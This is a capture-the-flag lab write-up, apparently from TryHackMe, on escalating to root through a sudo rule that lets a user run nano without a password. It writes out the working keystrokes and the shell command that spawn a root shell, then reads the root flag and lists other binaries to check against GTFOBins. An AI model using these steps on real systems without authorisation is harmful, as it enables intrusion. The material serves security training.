# Sudo Misconfiguration: Nano Root Shell

## Objective

Check whether the current user can execute any commands as another user (especially root) via sudo.

---

## Enumerate Sudo Permissions

Always start by checking the user's sudo privileges:

```bash
sudo -l
```

Example output:

```text
User john may run the following commands on sudo-box:
    (ALL) NOPASSWD: /usr/bin/nano
    (ALL) NOPASSWD: /usr/sbin/apache2
```

### Key Finding

The user can execute:

```text
/usr/bin/nano
```

as root without providing a password.

This is dangerous because Nano contains functionality that allows command execution. When Nano is launched through sudo, any spawned command inherits root privileges.

---

## Verification

Launch Nano as root:

```bash
sudo nano
```

Inside Nano:

1. Press `Ctrl + R`
2. Press `Ctrl + X`
3. Enter:

```bash
reset; sh 1>&0 2>&0
```

4. Press Enter

---

## Why It Works

* `sudo nano` runs Nano as root.
* `Ctrl + R` opens the "Read File" menu.
* `Ctrl + X` from that menu executes a command.
* `sh` spawns a shell.
* The shell inherits Nano's privileges (root).
* `reset` restores terminal settings before spawning the shell.

The result is an interactive root shell.

---

## Proof of Privilege Escalation

```bash
whoami
root

id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Capture the Flag

```bash
cd /root
cat flag.txt
```

Output:

```text
THM{SUDO-pwned-priv-esc}
```

---

## Takeaway

Whenever `sudo -l` reveals access to binaries such as:

```text
nano
vim
find
less
awk
perl
python
tar
nmap
```

check GTFOBins for known privilege escalation techniques.

Useful reference:

https://gtfobins.github.io
